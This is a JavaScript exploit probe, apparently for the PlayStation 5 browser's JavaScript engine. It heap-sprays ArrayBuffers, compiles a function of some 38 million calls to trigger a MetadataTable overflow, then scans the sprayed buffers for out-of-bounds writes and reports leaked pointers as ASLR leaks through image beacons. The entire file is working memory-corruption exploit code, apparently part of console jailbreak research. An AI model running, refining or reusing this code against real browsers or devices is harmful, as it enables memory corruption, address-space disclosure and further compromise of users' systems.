// p150h — MetadataTable overflow: MAXIMUM spray to survive 4.29GB sweep
//
// p150g used 2400 × 100KB = 240MB of VM. The sweep is 4.29GB. Not enough.
// This probe sprays until OOM, frees most (MADV_FREE preserves VM),
// then compiles + calls. More VM mapped = more of the sweep stays safe.
//
// Beacon prefix: V150H-

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V150H-' + tag + '&t=' + Date.now(); } catch(e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function readHex8(view, off) {
    var hex = '';
    for (var h = 7; h >= 0; h--) hex += hexByte(view[off + h]);
    return hex;
  }
  function readU32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT');

  var BUF_SZ = 100096;

  // Phase 1: Spray until OOM — learn the PS5 browser's limit
  var megaSpray = [];
  var count = 0;
  try {
    while (count < 50000) {
      megaSpray.push(new ArrayBuffer(BUF_SZ));
      count++;
    }
  } catch(e) {
    B('OOM-AT-' + count);
  }
  if (count >= 50000) B('MAXED-' + count);

  var totalMB = Math.round(count * BUF_SZ / 1048576);
  B('SPRAYED-' + count + '-' + totalMB + 'MB');

  // Phase 2: Keep 500 targets (every Nth buffer for spread across VM)
  var TARGETS = 500;
  var stride = Math.max(1, Math.floor(count / TARGETS));
  var targets = [];
  var tViews = [];
  for (var i = 0; i < count && targets.length < TARGETS; i += stride) {
    targets.push(megaSpray[i]);
    tViews.push(new Uint8Array(megaSpray[i]));
  }
  B('TARGETS-' + targets.length + '-stride' + stride);

  // Phase 3: Release the mega spray — MADV_FREE preserves virtual mappings
  megaSpray.length = 0;
  megaSpray = null;
  B('RELEASED');

  // Phase 4: Aggressive GC — free physical memory but keep VM mapped
  for (var g = 0; g < 20; g++) {
    var junk = [];
    for (var j = 0; j < 30000; j++) junk.push({x: j, y: j*2});
    junk = null;
  }
  B('GC-DONE');

  // Phase 5: Compile 38M function
  var N = 38348816;
  B('BUILD-N' + N);

  var CHUNK = 4000000;
  var nChunks = Math.floor(N / CHUNK);
  var rem = N - nChunks * CHUNK;
  var callChunk = 'a();'.repeat(CHUNK);

  var parts = ['window.__p150fn=function(a){'];
  for (var c = 0; c < nChunks; c++) parts.push(callChunk);
  parts.push('a();'.repeat(rem));
  parts.push('};window.__p150ok=1;');
  callChunk = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  var blobMB = Math.round(blob.size / 1048576);
  B('BLOB-' + blobMB + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { B('SCRIPT-ERR'); };
  sc.onload = function() {
    if (!window.__p150ok) { B('COMPILE-FAIL'); return; }
    B('COMPILED-OK');

    // Phase 6: Second GC pass after compilation freed bytecode temp buffers
    for (var g2 = 0; g2 < 5; g2++) {
      var j2 = [];
      for (var k = 0; k < 10000; k++) j2.push(k);
      j2 = null;
    }

    // Phase 7: CALL — triggers finishCreation → 4.29GB sweep
    B('CALLING');

    try {
      window.__p150fn(function() { throw 'STOP'; });
    } catch(e) {
      B('CALL-CAUGHT-' + String(e).substring(0, 30));
    }

    B('SURVIVED');
    setTimeout(phaseScan, 100);
  };
  document.head.appendChild(sc);
  sc.src = url;

  // Phase 8: Scan targets for OOB writes
  function phaseScan() {
    B('SCAN-START');
    var hitBufs = 0;
    var leaks = [];

    for (var i = 0; i < tViews.length; i++) {
      var view = tViews[i];
      if (!view) continue;

      var hasData = false;
      for (var s = 0; s < view.length; s += 112) {
        if (view[s + 12] !== 0 || view[s + 24] !== 0) { hasData = true; break; }
      }
      if (!hasData) continue;

      hitBufs++;

      var nz = 0;
      for (var j = 0; j < view.length; j++) if (view[j]) nz++;

      if (hitBufs <= 8) {
        B('HIT-' + i + '-nz' + nz);

        var ptrs = 0;
        for (var off = 24; off + 8 <= view.length && ptrs < 5; off += 112) {
          if (view[off] === 0 && view[off+1] === 0 && view[off+2] === 0 && view[off+3] === 0 &&
              view[off+4] === 0 && view[off+5] === 0 && view[off+6] === 0 && view[off+7] === 0) continue;
          var hex = readHex8(view, off);
          B('PTR-' + i + '-O' + off + '=' + hex);
          ptrs++;
          if (leaks.length < 10) leaks.push(hex);
        }

        for (var off = 12; off + 4 <= view.length; off += 112) {
          var v = readU32(view, off);
          if (v === 0xFFFFFFFF) {
            B('FF-' + i + '-O' + off);
            break;
          }
        }
      }
    }

    B('RESULT-hits' + hitBufs + '-leaks' + leaks.length);
    for (var l = 0; l < Math.min(leaks.length, 10); l++) {
      B('ASLR-' + l + '-' + leaks[l]);
    }
    B('DONE');
  }
})();
